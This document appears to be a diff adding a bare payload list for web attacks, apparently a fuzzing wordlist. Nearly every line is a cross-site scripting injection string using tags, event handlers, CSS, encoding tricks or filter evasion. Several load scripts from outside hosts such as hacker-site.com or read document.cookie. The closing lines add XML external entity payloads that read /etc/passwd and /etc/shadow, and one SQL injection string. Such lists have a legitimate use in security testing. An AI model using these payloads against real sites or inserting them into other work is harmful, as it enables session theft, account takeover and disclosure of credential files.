+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:confirm();">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>confirm()</SCRIPT>">
+<;META HTTP-EQUIV=";Set-Cookie"; Content=";USERID=<;SCRIPT>;confirm(';XSS';)<;/SCRIPT>;";>;
+<meta HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.vulnerable=true</SCRIPT>">
+<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow="confirm()";
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:confirm()"></OBJECT>
+<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:confirm(';XSS';)>;<;/OBJECT>;
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></object>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:confirm()></OBJECT>
+<object classid="clsid:..." codebase="javascript:document.vulnerable=true;">
+<object data="data:text/html;base64,%(base64)s">
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
+<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:confirm()" style="behavior:url(#x);"><param name=postdomevents /></object>
+<object onbeforeload object onbeforeload="javascript:javascript:confirm()"></object onbeforeload>
+<object onerror=javascript:javascript:confirm()>
+<object onError object onError="javascript:javascript:confirm()"></object onError>
+<object src=1 href=1 onerror="javascript:confirm()"></object>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://hacker.com/xss.html">
+<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://www.google.com/scriptlet.html"></object>
+ <OBJECT TYPE="text/x-scriptlet" DATA="http://www.google.com/scriptlet.html"></OBJECT>
+<;OBJECT TYPE=";text/x-scriptlet"; DATA=";http://www.google.com/scriptlet.html";>;<;/OBJECT>;
+<OBJECT TYPE="text/x-scriptlet" DATA="http://www.google.com/scriptlet.html"></OBJECT>
+<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
+"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+"onclick=prompt(8)>"@x.y
+" onfocus=confirm(document.domain) "> <"
+perl -e &#039;print \";<;IMG SRC=java\0script:confirm(\";XSS\";)>;\";;&#039; >; out
+perl -e &#039;print \&quot;&lt;IMG SRC=java\0script:confirm(\&quot;XSS\&quot;)&gt;\&quot;;&#039; &gt; out
+perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;confirm(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;\&quot;;&#039; &gt; out
+perl -e &#039;print \";<;SCR\0IPT>;confirm(\";XSS\";)<;/SCR\0IPT>;\";;&#039; >; out
+perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;confirm(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out
+perl -e &apos;print &quot;&lt;IMG SRC=java\0script:confirm(&quot;XSS&quot;)>&quot;;&apos;&gt; out
+perl -e 'print "<IMG SRC=java\0script:confirm(\"XSS\")>";' > out
+perl -e 'print \"<IMG SRC=java\0script:confirm(\"XSS\")>\";' > out
+perl -e ';print ";<;IM SRC=java\0script:confirm(";XSS";)>";;';>; out
+perl -e 'print \"&lt;IMG SRC=java\0script&#058;confirm(\\"XSS\\")&gt;\";' &gt; out
+perl -e 'print \"&lt;SCR\0IPT&gt;confirm(\\"XSS\\")&lt;/SCR\0IPT&gt;\";' &gt; out
+perl -e ';print ";&;<;SCR\0IPT>;confirm(";XSS";)<;/SCR\0IPT>;";;'; >; out
+perl -e 'print \"<SCR\0IPT>confirm(\"XSS\")</SCR\0IPT>\";' > out
+</plaintext\></|\><plaintext/onmouseover=prompt(1)
+"-prompt(8)-"
+'-prompt(8)-'
+<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:confirm()">
+"'`><p><svg><script>a='hello\x27;javascript:confirm()//';</script></p>
+\&quot;;confirm(&apos;XSS&apos;);//
+&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=confirm(&quot;XSS&quot;)&gt;
+Redirect 302 /a&#46;jpg http&#58;//google&#46;com/admin&#46;asp&deleteuser
+Redirect 302 /a.jpg http://google.com/admin.asp&amp;deleteuser
+Redirect 302 /a.jpg http://google.com/admin.asp&;deleteuser
+Redirect 302 /a.jpg http://google.com/admin.asp&deleteuser
+"><s"%2b"cript>confirm(1)</script>
+“><s”%2b”cript>confirm(1)</script>
+</scrip</script>t><img src =q onerror=prompt(8)>
+<script /*%00*/>/*%00*/confirm()/*%00*/</script /*%00*/
+<script>({0:#0=alert/#0#/#0#(0)})</script>
+<script>({0:#0=alert/#0#/#0#(123)})</script>
+<script>({0:#0=eval/#0#/#0#(javascript:confirm())})</script>
+<script>+-+-1-+-+confirm()</script>
+>"><ScRiPt%20%0a%0d>confirm(561177485777)%3B</ScRiPt>
+<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
+<;SCRIPT a=";blah"; ';'; SRC=";http://www.google.com/xss.js";>;<;/SCRIPT>;
+<script "a='>'" SRC="http://www.google.com/xss.js"></script>
+<script a=">" '' SRC="http://www.google.com/xss.js"></script>
+<script a=">" SRC="http://www.google.com/xss.js"></script>
+<script a=">'>" SRC="http://www.google.com/xss.js"></script>
+<script a=`>` SRC="http://www.google.com/xss.js"></script>
+<;SCRIPT ";a=';>;';"; SRC=";http://www.google.com/xss.js";>;<;/SCRIPT>;
+<;SCRIPT a=";>';>"; SRC=";http://www.google.com/xss.js";>;<;/SCRIPT>;
+<;SCRIPT a=";>;"; SRC=";http://www.google.com/xss.js";>;<;/SCRIPT>;
+<;SCRIPT a=`>;` SRC=";http://www.google.com/xss.js";>;<;/SCRIPT>;
+<SCRIPT "a='>'" SRC="http://www.google.com/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://www.google.com/xss.js"></SCRIPT>
+<SCRIPT a=">" SRC="http://www.google.com/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://www.google.com/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://www.google.com/xss.js"></SCRIPT>
+<;SCRIPT>;a=/XSS/
+<SCRIPT>a=/XSS/confirm(a.source)</SCRIPT>
+<script>a=/XSS/\ndocument.vulnerable=true;</script>
+<script <B>document.vulnerable=true;</script>
+<;SCRIPT =";blah"; SRC=";http://www.google.com/xss.js";>;<;/SCRIPT>;
+<script charset="\x22>javascript:confirm()</script>
+<script ~~~>confirm(0%0)</script ~~~>
+"><script>confirm(0)</script>
+<script>confirm(123);</script>
+<script>confirm(123)</script>
+<script>confirm(1337)</script><marquee><h1>XSS by xss</h1></marquee>
+"><script>confirm(1337)</script>"><script>confirm("XSS by \nxss</h1></marquee>
+<script>confirm(1);</script>
+<script>confirm(1)</script>
+='><script>confirm(1)</script>
+>"><script>confirm(1)</script>&
+“><<script>confirm(1);//<</script>
+“><script>confirm(1)</script>
+<ScRipT>confirm(1);</ScRipT>
+“><ScRiPt>confirm(1)</script>
+<;<;SCRIPT>;confirm(1);//<;<;/SCRIPT>;
+<;SCRIPT>;confirm(1)<;/SCRIPT>;
+<<SCRIPT>confirm(1);//<</SCRIPT>
+<?='<SCRIPT>confirm(1)</SCRIPT>'?>
+<SCRIPT> confirm(1); </SCRIPT>
+"><script>confirm(1)</script>><marquee><h1>XSS by xss</h1></marquee>
+<script>confirm(1)</script><marquee><h1>XSS by xss</h1></marquee>
+<script>confirm(1)</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510
+<script>confirm(1);</script>&search=1
+!--" /><script>confirm();</script>
+"><script>confirm()</script>
+'">><script>confirm()</script>
+<%<!--'%><script>confirm();</script -->
+<script /**/>/**/confirm()/**/</script /**/
+<script>confirm();</script>
+<script>confirm()</script>
+<ScRiPt>confirm()</sCriPt>
+<script ^__^>confirm(String.fromCharCode(49))</script ^__^
+"><script>confirm(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
+"><script confirm(String.fromCharCode(88,83,83))</script>
+<script>confirm(String.fromCharCode(88,83,83))</script> 
+<;SCRIPT>;confirm(String.fromCharCode(88,83,83))<;/SCRIPT>;
+"><SCRIPT>confirm(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt="
+'><SCRIPT>confirm(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt='
+\'><SCRIPT>confirm(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=\'
+<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+<script>crypto.generateCRMFRequest('CN=0',0,0,null,'confirm()',384,null,'rsa-dual-use')</script>
+&<script>document.vulnerable=true;</script>
+<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->
+<![<!--]]<script>document.vulnerable=true;//--></script>
+<<script>document.vulnerable=true;</script>
+<script>document.vulnerable=true;</script>
+<<SCRIPT>document.vulnerable=true;//<</SCRIPT>
+<SCRIPT>document.write(1);</SCRIPT>
+<script>document.write("<SCRI");</SCRIPT>PT SRC="http://www.google.com/xss.js"></script>
+<;SCRIPT>;document.write(";<;SCRI";);<;/SCRIPT>;PT SRC=";http://www.google.com/xss.js";>;<;/SCRIPT>;
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://www.google.com/xss.js"></SCRIPT>
+<SCRIPT FOR=document EVENT=onreadystatechange>javascript:confirm()</SCRIPT>
+<script>for((i)in(self))eval(i)(1)</script>
+<script>if("x\\xE0\xB9\x92".length==2) { javascript:confirm();}</script>
+<script>if("x\\xE1\x96\x89".length==2) { javascript:confirm();}</script>
+<script>if("x\\xEE\xA9\x93".length==2) { javascript:confirm();}</script>
+</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
+</script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>
+<script itworksinallbrowsers>/*<script* */confirm()</script
+"`'><script>-javascript:confirm()</script>
+<script>javascript:confirm()</script>
+<script>javascript:confirm()</script\x0A
+<script>javascript:confirm()</script\x0B
+<script>javascript:confirm()</script\x0D
+<script>javascript:confirm()<\x00/script>
+<script language="JavaScript">confirm()</script>
+'""><script language="JavaScript"> confirm('X \nS \nS');</script>
+<script language='javascript' src='%(jscript)s'></script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('confirm()')()</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:confirm()')()</script>
+<script onLoad script onLoad="javascript:javascript:confirm()"></script onLoad>
+<SCRIPT onreadystatechange=javascript:javascript:confirm();></SCRIPT>
+<script onReadyStateChange script onReadyStateChange="javascript:javascript:confirm()"></script onReadyStateChange>
+<script>%(payload)s</script>
+<<SCRIPT>%(payload)s//<</SCRIPT>
+<script>ReferenceError.prototype.__defineGetter__('name', function(){confirm(123)}),x</script>
+<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:confirm()}),x</script>
+</script><script >confirm(document.cookie)</script>
+</script><script>confirm();</script>
+</script><script>confirm()</script>
+<;/script>;<;script>;confirm()<;/script>;
+//--></SCRIPT><SCRIPT>confirm(String.fromCharCode(88,83,83));
+></SCRIPT>">'><SCRIPT>confirm(String.fromCharCode(88,83,83))</SCRIPT>
+</script></script><<<<script><>>>><<<script>confirm(123)</script>
+<script>({set/**/$($){_/**/setter=$,_=javascript:confirm()}}).$=eval</script>
+ <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
+<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
+<script src=1 href=1 onerror="javascript:confirm()"></script>
+<script src="#">{confirm()}</script>;1
+<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
+<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
+<script/src=data:,confirm()>
+<script src="data:text/javascript,confirm()"></script>
+<script src="data:text/plain\x2Cjavascript:confirm()"></script>
+<script src="data:\xCB\x8F,javascript:confirm()"></script>
+<script src="data:\xD4\x8F,javascript:confirm()"></script>
+<script src="data:\xE0\xA4\x98,javascript:confirm()"></script>
+<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>
+//|\\ <script //|\\ src='https://www.google.com/u/13018058/js.js'> //|\\ </script //|\\
+<script SRC="http://www.google.com/xss.jpg"></script>
+<;SCRIPT SRC=";http://www.google.com/xss.jpg";>;<;/SCRIPT>;
+<SCRIPT SRC="http://www.google.com/xss.jpg"></SCRIPT>
+<;SCRIPT SRC=http://www.google.com/xss.js
+<SCRIPT SRC=http://www.google.com/xss.js?< B >
+<script =">" SRC="http://www.google.com/xss.js"></script>
+<;SCRIPT SRC=http://www.google.com/xss.js>;<;/SCRIPT>;
+<SCRIPT =">" SRC="http://www.google.com/xss.js"></SCRIPT>
+<SCRIPT SRC=http://www.google.com/xss.js></SCRIPT>
+<SCRIPT/SRC="http://www.google.com/xss.js"></SCRIPT>
+'>"><script src = 'http://www.site.com/XSS.js'></script>
+<script src=http://yoursite.com/your_files.js></script>
+<script src="javascript:confirm()">
+<SCRIPT SRC="%(jpg)s"></SCRIPT>
+<SCRIPT SRC=%(jscript)s?<B>
+<script src="/\%(jscript)s"></script>
+<script src="\\%(jscript)s"></script>
+<script src=%(jscript)s></script>
+<SCRIPT/SRC="%(jscript)s"></SCRIPT>
+<script+src=">"+src="http://yoursite.com/xss.js?69,69"></script>
+<;SCRIPT SRC=//www.google.com/.j>;
+<SCRIPT SRC=//www.google.com/.j>
+<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
+<script/&Tab; src='https://www.google.com/u/13018058/js.js' /&Tab;></script>
+<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
+<script>var var = 1; confirm(var)</script>
+"`'><script>\x00javascript:confirm()</script>
+<script>/* *\x00/javascript:confirm()// */</script>
+<script\x00>javascript:confirm()</script>
+"`'><script>\x09javascript:confirm()</script>
+<script\x09>javascript:confirm()</script>
+<script\x09type="text/javascript">javascript:confirm();</script>
+"`'><script>\x0Ajavascript:confirm()</script>
+<script\x0A>javascript:confirm()</script>
+<script\x0Atype="text/javascript">javascript:confirm();</script>
+"`'><script>\x0Bjavascript:confirm()</script>
+"`'><script>\x0Cjavascript:confirm()</script>
+<script\x0C>javascript:confirm()</script>
+<script\x0Ctype="text/javascript">javascript:confirm();</script>
+"`'><script>\x0Djavascript:confirm()</script>
+<script\x0D>javascript:confirm()</script>
+<script\x0Dtype="text/javascript">javascript:confirm();</script>
+"`'><script>\x20javascript:confirm()</script>
+<script\x20>javascript:confirm()</script>
+<script\x20type="text/javascript">javascript:confirm();</script>
+"`'><script>\x21javascript:confirm()</script>
+<script>/* *\x2A/javascript:confirm()// */</script>
+"`'><script>\x2Bjavascript:confirm()</script>
+'"`><script>/* *\x2Fjavascript:confirm()// */</script>
+<script\x2F>javascript:confirm()</script>
+<script\x2Ftype="text/javascript">javascript:confirm();</script>
+"`'><script>\x3Bjavascript:confirm()</script>
+<script\x3Etype="text/javascript">javascript:confirm();</script>
+"`'><script>\x7Ejavascript:confirm()</script>
+"`'><script>\xC2\x85javascript:confirm()</script>
+"`'><script>\xC2\xA0javascript:confirm()</script>
+<script x> confirm() </script 1=2
+"`'><script>\xE1\x9A\x80javascript:confirm()</script>
+"`'><script>\xE1\xA0\x8Ejavascript:confirm()</script>
+"`'><script>\xE2\x80\x80javascript:confirm()</script>
+"`'><script>\xE2\x80\x81javascript:confirm()</script>
+"`'><script>\xE2\x80\x82javascript:confirm()</script>
+"`'><script>\xE2\x80\x83javascript:confirm()</script>
+"`'><script>\xE2\x80\x84javascript:confirm()</script>
+"`'><script>\xE2\x80\x85javascript:confirm()</script>
+"`'><script>\xE2\x80\x86javascript:confirm()</script>
+"`'><script>\xE2\x80\x87javascript:confirm()</script>
+"`'><script>\xE2\x80\x88javascript:confirm()</script>
+"`'><script>\xE2\x80\x89javascript:confirm()</script>
+"`'><script>\xE2\x80\x8Ajavascript:confirm()</script>
+"`'><script>\xE2\x80\x8Bjavascript:confirm()</script>
+"`'><script>\xE2\x80\xA8javascript:confirm()</script>
+"`'><script>\xE2\x80\xA9javascript:confirm()</script>
+"`'><script>\xE2\x80\xAFjavascript:confirm()</script>
+"`'><script>\xE2\x81\x9Fjavascript:confirm()</script>
+"`'><script>\xE3\x80\x80javascript:confirm()</script>
+"`'><script>\xEF\xBB\xBFjavascript:confirm()</script>
+"`'><script>\xEF\xBF\xAEjavascript:confirm()</script>
+"`'><script>\xEF\xBF\xBEjavascript:confirm()</script>
+"`'><script>\xF0\x90\x96\x9Ajavascript:confirm()</script>
+<;SCRIPT/XSS SRC=";http://www.google.com/xss.js";>;<;/SCRIPT>;
+<SCRIPT/XSS SRC="http://www.google.com/xss.js"></SCRIPT>
+<scr<script>ipt>confirm(document.cookie)</scr</script>ipt>
+<;scrscriptipt>;confirm()<;/scrscriptipt>;
+<scr<script>ipt>confirm();</scr</script>ipt>
+<scr<script>ipt>confirm()</scr</script>ipt>
+<scrscriptipt>confirm()</scrscriptipt>
+<sCR<script>iPt>confirm()</SCr</script>IPt>
+<scr<script>ipt>confirm()</scr</script>ipt><scr<script>ipt>confirm()</scr</script>ipt>
+'></select><script>confirm(123)</script>
+src="http://www.site.com/XSS.js"></script>
+</style &#32;><script &#32; :-(>/**/confirm(document.location)/**/</script &#32; :-(
+<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:confirm();');}</STYLE>
+<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
+<style>BODY{-moz-binding:url("http://www.google.com/xssmoz.xml#xss")}</style>
+<;STYLE>;BODY{-moz-binding:url(";http://www.google.com/xssmoz.xml#xss";)}<;/STYLE>;
+<STYLE>BODY{-moz-binding:url("http://www.google.com/xssmoz.xml#xss")}</STYLE>
+<style><img src="</style><img src=x onerror=confirm(123)//">
+<style><img src="</style><img src=x onerror=confirm(XSS)//">
+<style><img src="</style><img src=x onerror=javascript:confirm()//">
+<STYLE>@import'%(css)s';</STYLE>
+<style>*[{}@import'%(css)s?]</style>X
+<style>@import "data:,*%7bx:expression(javascript:confirm())%7D";</style>
+<style>@import'http://www.google.com/xss.css';</style>
+<;STYLE>;@import';http://www.google.com/xss.css';;<;/STYLE>;
+<STYLE>@import'http://www.google.com/xss.css';</STYLE>
+<STYLE>@im\port'\ja\vasc\ript:confirm(1)';</STYLE>
+"><STYLE>@import"javascript:confirm()";</STYLE>
+<style>@im\port'\ja\vasc\ript:confirm(\"XSS\")';</style>
+<;STYLE>;@im\port';\ja\vasc\ript:confirm(";XSS";)';;<;/STYLE>;
+<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>
+<;STYLE>;li {list-style-image: url(";javascript:confirm(&#39;XSS&#39;)";);}<;/STYLE>;<;UL>;<;LI>;XSS
+<STYLE>li {list-style-image: url(\"javascript:confirm()\");}</STYLE><UL><LI>XSS
+<STYLE>li {list-style-image: url("javascript:confirm()");}</STYLE><UL><LI>XSS</br>
+<style>li {list-style-image: url("javascript:document.vulnerable=true;");</STYLE><UL><LI>XSS
+<STYLE>li {list-style-image: url("javascript:javascript:confirm()");}</STYLE><UL><LI>XSS
+<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+<style onLoad style onLoad="javascript:javascript:confirm()"></style onLoad>
+<style onreadystatechange=javascript:javascript:confirm();></style>
+<style onReadyStateChange style onReadyStateChange="javascript:javascript:confirm()"></style onReadyStateChange>
+<style>p[foo=bar{}*{-o-link:'javascript:javascript:confirm()'}{}*{-o-link-source:current}]{color:red};</style>
+}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
+<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
+<style><!--</style><script>document.vulnerable=true;//--></script>
+<style></style\x09<img src="about:blank" onerror=javascript:confirm()//></style>
+<style></style\x0A<img src="about:blank" onerror=javascript:confirm()//></style>
+<style></style\x0D<img src="about:blank" onerror=javascript:confirm()//></style>
+<style></style\x20<img src="about:blank" onerror=javascript:confirm()//></style>
+<style></style\x3E<img src="about:blank" onerror=javascript:confirm()//></style>
+<STYLE type="text/css">BODY{background:url("javascript:confirm()")}</STYLE>
+<;STYLE type=";text/css";>;BODY{background:url(";javascript:confirm(';XSS';)";)}<;/STYLE>;
+<style type="text/css">BODY{background:url("javascript:document.vulnerable=true")}</style>
+<STYLE type="text/css">BODY{background:url("javascript:javascript:confirm()")}</STYLE>
+<STYLE TYPE="text/javascript">confirm();</STYLE>
+<;STYLE TYPE=";text/javascript";>;confirm(';XSS';);<;/STYLE>;
+<style type="text/javascript">document.vulnerable=true;</style>
+<style TYPE="text/javascript">document.vulnerable=true;</style>
+<STYLE TYPE="text/javascript">javascript:confirm();</STYLE>
+<// style=x:expression\28javascript:confirm()\29>
+<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:confirm())}</style>
+<STYLE>.XSS{background-image:url("javascript:confirm()");}</STYLE><A CLASS=XSS></A>
+<;STYLE>;.XSS{background-image:url(";javascript:confirm(';XSS';)";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;
+<style>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></a>
+<STYLE>.XSS{background-image:url("javascript:javascript:confirm()");}</STYLE><A CLASS=XSS></A>
+<svg contentScriptType=text/vbs><script>MsgBox+1
+<svg/onload=%26%23097lert%26lpar;1337)>
+<svg/onload=confirm()
+<svg onload="javascript:confirm(123)" xmlns="#"></svg>
+<svg onload svg onload="javascript:javascript:confirm()"></svg onload>
+<svg onLoad svg onLoad="javascript:javascript:confirm()"></svg onLoad>
+<svg onResize svg onResize="javascript:javascript:confirm()"></svg onResize>
+<svg onunload svg onunload="javascript:javascript:confirm()"></svg onunload>
+<svg onUnload svg onUnload="javascript:javascript:confirm()"></svg onUnload>
+<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
+<sVg><scRipt >alert&lpar;1&rpar; {Opera}
+<svg><script ?>confirm()
+<svg><script>//&NewLine;confirm(1);</script </svg>
+<svg><script onlypossibleinopera:-)> confirm()
+<svg><script x:href='https://www.google.com/u/13018058/js.js' {Opera}
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/') </script
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
+<svg xmlns="http://www.w3.org/2000/svg">LOL<script>confirm(123)</script></svg>
+<svg xmlns="#"><script>confirm()</script></svg>
+<TABLE BACKGROUND="javascript:confirm()">
+<;TABLE BACKGROUND=";javascript:confirm(';XSS';)";>;<;/TABLE>;
+<table BACKGROUND="javascript:document.vulnerable=true;">
+<table background="javascript:javascript:confirm()">
+<TABLE BACKGROUND="javascript:javascript:confirm()">
+<TABLE><TD BACKGROUND="javascript:confirm()">
+<;TABLE>;<;TD BACKGROUND=";javascript:confirm(';XSS';)";>;<;/TD>;<;/TABLE>;
+<table><TD BACKGROUND="javascript:document.vulnerable=true;">
+<TABLE><TD BACKGROUND="javascript:javascript:confirm()">
+<TD BACKGROUND="javascript:confirm()">
+</textarea>'"><script>confirm(document.cookie)</script>
+</textarea><script>confirm(/xss/)</script>
+<title onpropertychange=javascript:confirm()></title><title title=>
+<title onPropertyChange title onPropertyChange="javascript:javascript:confirm()"></title onPropertyChange>
+'"></title><script>confirm(1111)</script>
+'"></title><script>confirm(1337)</script>><marquee><h1>XSS by xss</h1></marquee>
+</TITLE><SCRIPT>confirm(1);</SCRIPT>
+<;/TITLE>;<;SCRIPT>;confirm(1);<;/SCRIPT>;
+'"></title><script>confirm("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
+</title><script>confirm(/xss/)</script>
+</title><SCRIPT>document.vulnerable=true;</script>
+\u003c
+\u003C
+'%uff1cscript%uff1econfirm()%uff1c/script%uff1e'
+<var onmouseover="prompt(1)">On Mouse Over</var>
+veris-->group<svg/onload=confirm(/XSS/)//
+<video onerror="javascript:javascript:confirm()"><source>
+<video poster=javascript:javascript:confirm()//
+<video/poster/onerror=confirm()>
+<video><source onerror="javascript:javascript:confirm()">
+<video src=1 href=1 onerror="javascript:confirm()"></video>
+<video src=1 onerror=confirm()>
+<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
+<w contenteditable id=x onfocus=confirm()>
+window.confirm("Bonjour !");
+&#x000003c
+&#x000003c;
+&#x000003C
+&#x000003C;
+&#X000003c
+&#X000003c;
+&#X000003C
+&#X000003C;
+&#x00003c
+&#x00003c;
+&#x00003C
+&#x00003C;
+&#X00003c
+&#X00003c;
+&#X00003C
+&#X00003C;
+&#x0003c
+&#x0003c;
+&#x0003C
+&#x0003C;
+&#X0003c
+&#X0003c;
+&#X0003C
+&#X0003C;
+&#x003c
+&#x003c;
+&#x003C
+&#x003C;
+&#X003c
+&#X003c;
+&#X003C
+&#X003C;
+"'`><\x00img src=xxx:x onerror=javascript:confirm()>
+--><!-- --\x00> <img src=xxx:x onerror=javascript:confirm()> -->
+'`"><\x00script>javascript:confirm()</script>
+&#x03c
+&#x03c;
+&#x03C
+&#x03C;
+&#X03c
+&#X03c;
+&#X03C
+&#X03C;
+--><!-- --\x21> <img src=xxx:x onerror=javascript:confirm()> -->
+&#x3c
+&#x3c;
+\x3c
+&#x3C
+&#x3C;
+\x3C
+&#X3c
+&#X3c;
+&#X3C
+&#X3C;
+"'`><\x3Cimg src=xxx:x onerror=javascript:confirm()>
+'`"><\x3Cscript>javascript:confirm()</script>
+'`"><\x3Cscript>javascript:confirm()</script>        
+\x3Cscript>javascript:confirm()</script>
+--><!-- --\x3E> <img src=xxx:x onerror=javascript:confirm()> -->
+<!--\x3E<img src=xxx:x onerror=javascript:confirm()> -->
+">/XaDoS/><script>confirm(document.cookie)</script><script src="http://www.site.com/XSS.js"></script>
+[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>
+<x '="foo"><x foo='><img src=x onerror=javascript:confirm()//'>
+<XML ID="1"><I><B><IMG SRC="javas<!-- -->cript:document.vulnerable=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></span>
+<xml id="1" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label>
+<;XML ID=I>;<;X>;<;C>;<;![CDATA[<;IMG SRC=";javas]]>;<;![CDATA[cript:confirm(';XSS';);";>;]]>;
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:confirm();">]]</C><X></xml>
+<XML ID=I><X><C><![<IMG SRC="javas]]<![cript:document.vulnerable=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></span>
+<xml id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml>
+<;XML ID=";xss";>;<;I>;<;B>;<;IMG SRC=";javas<;!-- -->;cript:confirm(';XSS';)";>;<;/B>;<;/I>;<;/XML>;
+<xml onPropertyChange xml onPropertyChange="javascript:javascript:confirm()"></xml onPropertyChange>
+<;XML SRC=";http://www.google.com/xsstest.xml"; ID=I>;<;/XML>;
+<xml src="javascript:document.vulnerable=true;">
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>confirm('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
